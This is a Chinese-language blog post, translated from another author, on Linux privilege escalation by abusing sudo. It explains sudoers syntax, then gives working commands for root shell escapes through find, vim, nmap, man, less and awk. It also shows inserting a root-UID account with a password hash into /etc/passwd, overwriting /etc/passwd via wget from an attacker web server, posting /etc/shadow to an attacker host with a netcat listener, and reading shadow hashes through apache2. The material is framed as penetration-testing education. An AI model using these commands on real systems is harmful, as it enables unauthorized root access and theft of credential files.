---
title: "Abusing SUDO (Linux Privilege Escalation)"
date: 2018-08-24
author: "Mars Cheng"
summary: "Liunx權限提升-濫用Sudo"
translationKey: "abusing-sudo-linux-privilege-escalation"
slug: "abusing-sudo-linux-privilege-escalation"
aliases:
  - /blog/2018/abusing-sudo-linux-privilege-escalation/
  - /2018/abusing-sudo-linux-privilege-escalation/
tags:
  - "Penetration Testing"
  - "Security Technique"
  - "Linux System"
  - "Translating Articles"
---

## Overview

> This is Translating Articles which from <http://touhidshaikh.com/blog/?p=790>, if any problem,  If any mistake or suggestion, please let we konw. Thanks.
> 本篇文章翻譯自 <http://touhidshaikh.com/blog/?p=790>，如有任何問題敬請不吝指教。


> 當某些程式/指令的shell有其限制時，我們通常會使用Sudo來提升權限。本文將展現一些方式藉由Sudo來提升權限。但首先，我們要先了解何謂Sudo，再進行進階的利用。

## Index

1. 什麼是SUDO?
2. Sudoer檔案語法
3. 利用SUDO使用者
    * /usr/bin/find
    * /usr/bin/nano
    * /usr/bin/vim
    * /usr/bin/man
    * /usr/bin/awk
    * /usr/bin/less
    * /usr/bin/nmap ( –interactive and –script method)
    * /bin/more
    * /usr/bin/wget
    * /usr/sbin/apache2

### 1. 什麼是SUDO?
Sudo(Substitute User and Do)允許一般使用者被授權執行需特權資源的程式/行為，換句話說，使用者可以使用自己的身份/密碼在root(或其他使用者)下執行命令，具體內容取決於sudoer設定中授與存取權限的內容，該設定可以在/etc/sudoers中找到。

---
### 2. Sudoer檔案語法

```
root ALL=(ALL) ALL
```
說明1:root可以從所有終端中執行，允許所有(任何)使用者，並執行所有（任何）指令
* 第一部分是使用者，第二部分是使用者可以使用sudo指令的終端，第三部分是使用者可以擔任的使用者身份，最後一部分是使用時可以執行的指令


```
touhid ALL= /sbin/poweroff
```
說明2:使用者可以從任何終端以使用者touhid的密碼執行「關閉」指令


```
touhid ALL = (root) NOPASSWD: /usr/bin/find
```
說明3:使用者touhid可以從任何終端，以root身份執行查找指令且無需密碼

---
### 3. 利用SUDO使用者

要利用sudo使用者，必須先找到允許執行的命令

```
sudo -l
```
上述指令顯示允許當前使用者執行的命令


![](https://i.imgur.com/mBNG39n.png)
上述圖片顯示無需密碼便可以root身份執行的指令


以下針對使用sudo達成權限提升的細節進行說明

* 1.**使用Find指令**
```
sudo find /etc/passwd -exec /bin/sh \;
```
或
```
sudo find /bin -name nano -exec /bin/sh \;
```
* 2.**使用Vim指令**
```
sudo vim -c '!sh'
```
* 3.**使用Nmap指令**

舊方法
```
sudo nmap --interactive
nmap> !sh
sh-4.1#
```
<font color=red>注意：nmap --interactive選項無法使用在叫新版本的nmap中</font>

新方法-->不使用--interactive的方法

```
echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```
* 4.**使用Man指令**
```
sudo man man
```
然後輸入!sh及按下Enter

* 5.**使用Less/More指令**

```
sudo less /etc/hosts
或
sudo more /etc/hosts
```
然後輸入!sh及按下Enter
* 6.**使用awk指令**
```
 sudo awk 'BEGIN {system("/bin/sh")}'
```
* 7.**使用nano指令**

nano是文字編輯器，可以用來修改passwd文件，並在需要切換用戶之後以root權限加入password文件中的使用者。在/etc/passwd中增加此行可將此用戶添加root權限
```java
touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash
```

```
sudo nano  /etc/passwd
```
切換使用者密碼：test
```
su touhid
```
* 8.**使用wget指令**

這種非常酷的方式需要Web服務器下載文件。 這種方式我從未在任何地方看到過。 

**攻擊者端**
1. 將受害端/etc/passwd文件複製到攻擊者端中
2. 修改文件並將passwd文件增加以下資訊，並保存
```
touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash 
``` 
3. 將passwd托管至Web伺服器主機

**受害端**
```
sudo wget http://192.168.56.1:8080/passwd -O /etc/passwd
```
切換使用者密碼：test
```
su touhid
```
<font color=red>注意：如果想要從Web伺服器取得root的ssh金鑰或shadow檔案等</font>

```
sudo wget --post-file=/etc/shadow 192.168.56.1:8080
```
啟用listener於攻擊者端: nc -lvp 8080


* 9.**使用apache指令**

無法獲得shell與無法編輯系統檔案，但能夠檢視系統檔案
```
sudo apache2 -f /etc/shadow
```

輸出如下：
```
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
```
無法獲得shell，但可以嘗試破解Hash。

### Reference

[1] <http://touhidshaikh.com/blog/?p=790>
